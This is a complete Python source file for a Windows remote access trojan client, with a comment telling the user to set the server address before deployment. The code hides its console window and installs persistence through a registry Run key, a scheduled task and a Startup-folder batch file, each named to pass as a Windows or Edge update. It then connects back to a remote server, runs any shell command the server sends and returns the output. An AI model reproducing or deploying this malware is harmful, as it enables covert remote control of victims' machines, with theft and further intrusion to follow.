#!/usr/bin/env python3
"""
WINDOWS-SPECIFIC RAT CLIENT
Optimized for Windows environments
"""

import socket
import subprocess
import os
import json
import base64
import sys
import time
import platform
import winreg
import ctypes

# Configuration - CHANGE THESE BEFORE DEPLOYMENT
SERVER_HOST = "192.168.1.100"  # Your server IP
SERVER_PORT = 4444

class WindowsRATClient:
    def __init__(self, server_host, server_port):
        self.server_host = server_host
        self.server_port = server_port
        self.connected = False
        self.hidden = False
        
    def hide_window(self):
        """Hide console window on Windows"""
        try:
            if platform.system() == 'Windows':
                whnd = ctypes.windll.kernel32.GetConsoleWindow()
                if whnd != 0:
                    ctypes.windll.user32.ShowWindow(whnd, 0)  # SW_HIDE
                    self.hidden = True
                    return True
        except:
            pass
        return False

    def install_windows_persistence(self):
        """Install multiple persistence methods on Windows"""
        methods_installed = []
        script_path = os.path.abspath(sys.argv[0])
        
        try:
            # Method 1: Registry Run Key
            try:
                key = winreg.HKEY_CURRENT_USER
                subkey = r"Software\Microsoft\Windows\CurrentVersion\Run"
                reg_key = winreg.OpenKey(key, subkey, 0, winreg.KEY_SET_VALUE)
                winreg.SetValueEx(reg_key, "WindowsUpdate", 0, winreg.REG_SZ, script_path)
                winreg.CloseKey(reg_key)
                methods_installed.append("Registry Run")
            except Exception as e:
                print(f"Registry persistence failed: {e}")
            
            # Method 2: Scheduled Task
            try:
                task_name = "MicrosoftEdgeUpdate"
                cmd = f'schtasks /create /tn "{task_name}" /tr "{script_path}" /sc onlogon /f'
                result = subprocess.run(cmd, shell=True, capture_output=True, text=True)
                if result.returncode == 0:
                    methods_installed.append("Scheduled Task")
            except Exception as e:
                print(f"Task scheduler failed: {e}")
            
            # Method 3: Startup Folder
            try:
                startup_path = os.path.join(
                    os.path.expanduser("~"), 
                    "AppData", 
                    "Roaming", 
                    "Microsoft", 
                    "Windows", 
                    "Start Menu", 
                    "Programs", 
                    "Startup"
                )
                if os.path.exists(startup_path):
                    # Create a batch file to run our script
                    bat_content = f'@echo off\nstart "" pythonw "{script_path}"\n'
                    bat_path = os.path.join(startup_path, "WindowsUpdate.bat")
                    with open(bat_path, 'w') as f:
                        f.write(bat_content)
                    methods_installed.append("Startup Folder")
            except Exception as e:
                print(f"Startup folder failed: {e}")
            
            if methods_installed:
                print(f"[+] Windows persistence installed: {', '.join(methods_installed)}")
                return True
            else:
                print("[-] Failed to install Windows persistence")
                return False
                
        except Exception as e:
            print(f"Persistence installation error: {e}")
            return False

    def reliable_send(self, data):
        """Send data to server with error handling"""
        try:
            if isinstance(data, str):
                data = data.encode('utf-8')
            json_data = json.dumps(data.decode('utf-8', errors='ignore') if isinstance(data, bytes) else data)
            encoded_data = base64.b64encode(json_data.encode('utf-8'))
            self.socket.send(len(encoded_data).to_bytes(4, 'big') + encoded_data)
            return True
        except Exception as e:
            print(f"Send error: {e}")
            return False

    def reliable_receive(self):
        """Receive data from server with error handling"""
        try:
            raw_len = self.socket.recv(4)
            if not raw_len:
                return None
            data_len = int.from_bytes(raw_len, 'big')
            data = b''
            while len(data) < data_len:
                packet = self.socket.recv(data_len - len(data))
                if not packet:
                    return None
                data += packet
            
            decoded_data = base64.b64decode(data)
            return json.loads(decoded_data)
        except Exception as e:
            print(f"Receive error: {e}")
            return None

    def connect_to_server(self):
        """Connect to RAT server with timeout"""
        try:
            self.socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            self.socket.settimeout(30)
            self.socket.connect((self.server_host, self.server_port))
            self.connected = True
            print(f"[+] Connected to {self.server_host}:{self.server_port}")
            return True
        except Exception as e:
            print(f"Connection error: {e}")
            return False

    def execute_windows_command(self, command):
        """Execute Windows-specific commands"""
        try:
            # Change directory
            if command.startswith('cd '):
                path = command[3:].strip()
                os.chdir(path)
                return f"Changed directory to: {os.getcwd()}"
            
            # Windows-specific commands
            elif command == 'tasklist':
                result = subprocess.run('tasklist', shell=True, capture_output=True, text=True)
                return result.stdout if result.stdout else result.stderr
            
            elif command == 'ipconfig':
                result = subprocess.run('ipconfig /all', shell=True, capture_output=True, text=True)
                return result.stdout if result.stdout else result.stderr
            
            elif command == 'systeminfo':
                result = subprocess.run('systeminfo', shell=True, capture_output=True, text=True)
                return result.stdout if result.stdout else result.stderr
            
            elif command == 'whoami':
                result = subprocess.run('whoami /all', shell=True, capture_output=True, text=True)
                return result.stdout if result.stdout else result.stderr
            
            elif command == 'netstat':
                result = subprocess.run('netstat -ano', shell=True, capture_output=True, text=True)
                return result.stdout if result.stdout else result.stderr
            
            # Generic command execution
            else:
                result = subprocess.run(command, shell=True, capture_output=True, text=True)
                output = result.stdout if result.stdout else result.stderr
                return output if output else "Command executed successfully"
                
        except Exception as e:
            return f"Command execution error: {str(e)}"

    def start_client(self):
        """Main client loop with reconnection logic"""
        # Hide window and install persistence
        self.hide_window()
        self.install_windows_persistence()
        
        reconnect_attempts = 0
        max_reconnect_attempts = 10
        
        while reconnect_attempts < max_reconnect_attempts:
            try:
                if not self.connected:
                    print(f"[*] Attempting to connect to server... (Attempt {reconnect_attempts + 1})")
                    if not self.connect_to_server():
                        reconnect_attempts += 1
                        time.sleep(30)  # Wait 30 seconds before retry
                        continue
                
                # Reset reconnect attempts on successful connection
                reconnect_attempts = 0
                
                while self.connected:
                    # Receive command from server
                    command = self.reliable_receive()
                    if not command:
                        print("[-] Server disconnected")
                        self.connected = False
                        break
                    
                    if command.lower() in ['exit', 'quit']:
                        print("[*] Disconnecting by server request")
                        return
                    
                    # Execute command and send result
                    result = self.execute_windows_command(command)
                    if not self.reliable_send(result):
                        self.connected = False
                        break
                        
            except socket.timeout:
                print("[-] Connection timeout")
                self.connected = False
            except KeyboardInterrupt:
                print("\n[*] Client shutdown requested")
                break
            except Exception as e:
                print(f"Client error: {e}")
                self.connected = False
                reconnect_attempts += 1
                time.sleep(30)
        
        if reconnect_attempts >= max_reconnect_attempts:
            print("[-] Maximum reconnection attempts reached. Exiting.")

def main():
    """Main entry point for Windows client"""
    print("🐀 Windows RAT Client Starting...")
    print("=" * 50)
    print(f"Target Server: {SERVER_HOST}:{SERVER_PORT}")
    print("=" * 50)
    
    client = WindowsRATClient(SERVER_HOST, SERVER_PORT)
    client.start_client()
    
    print("[*] Windows RAT Client stopped")

if __name__ == "__main__":
    # If running with pythonw (no console), the print statements won't show
    # but the functionality will work
    main()